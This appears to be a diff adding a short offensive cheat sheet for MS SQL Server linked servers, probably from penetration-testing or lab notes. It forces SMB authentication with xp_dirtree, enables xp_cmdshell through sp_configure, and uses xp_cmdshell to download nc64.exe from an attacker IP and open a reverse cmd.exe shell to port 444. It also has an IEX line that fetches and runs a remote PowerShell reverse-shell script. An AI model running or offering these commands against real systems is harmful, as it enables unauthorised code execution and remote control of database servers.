@@ -1,1 +1,17 @@
 EXECUTE ('master.sys.xp_dirtree "\\192.168.X.Y\a"') AT LINKED-SERVER
+
+enable xp_cmdshell:
+EXECUTE ('sp_configure ''Show Advanced Options'', 1; RECONFIGURE;') AT SQL27
+EXECUTE ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT SQL27
+Test It:
+EXECUTE ('EXEC master..xp_cmdshell ''whoami''') AT SQL27
+
+
+Shell:
+Works well:
+EXECUTE ('EXEC xp_cmdshell ''powershell iwr -uri http://192.168.45.180/nc64.exe -o c:\\windows\\tasks\\nc64.exe''') AT SQL27
+EXECUTE ('EXEC xp_cmdshell ''c:\windows\tasks\nc64.exe 192.168.45.180 444 -e cmd.exe''') AT SQL27
+
+
+needs more testing:
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
